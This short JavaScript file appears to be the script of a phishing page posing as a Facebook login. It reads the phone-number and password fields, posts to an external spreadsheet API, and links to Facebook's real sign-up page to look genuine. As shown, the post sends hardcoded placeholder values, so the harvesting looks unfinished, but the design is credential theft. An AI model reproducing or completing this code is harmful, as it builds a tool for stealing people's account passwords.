window.addEventListener('load', () => {
    const params = (new URL(document.location)).searchParams
    const name = params.get('name');
    console.log(name)
});

function create(){
    window.open("https://www.facebook.com/reg/","_parent")
};

function lorgin(){
    var number = document.getElementById('number').value;
    var pass = document.getElementById('pass').value;

    fetch('https://sheetdb.io/api/v1/myawxgjvo61ub', {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ "number": "78912","pass": "5555" })
    })
    .then(response => response.json())
    .then(response => console.log(JSON.stringify(response)))
}
